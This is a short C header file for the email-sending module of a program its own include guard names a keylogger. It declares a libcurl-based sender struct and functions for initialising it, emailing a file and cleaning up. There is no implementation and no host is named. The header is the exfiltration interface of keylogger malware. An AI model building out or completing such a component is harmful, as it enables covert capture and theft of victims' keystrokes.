#ifndef Keylogger_SendEmail_H_SENTRY
#define Keylogger_SendEmail_H_SENTRY

#include <curl/curl.h>

typedef struct {
    CURL *curl;
    struct curl_slist *recipients;
} EmailSender;

int EmailSender_init(EmailSender *sender);
int send_file_via_email(EmailSender *sender, FileHandler *fh);
void EmailSender_cleanup(EmailSender *sender);

#endif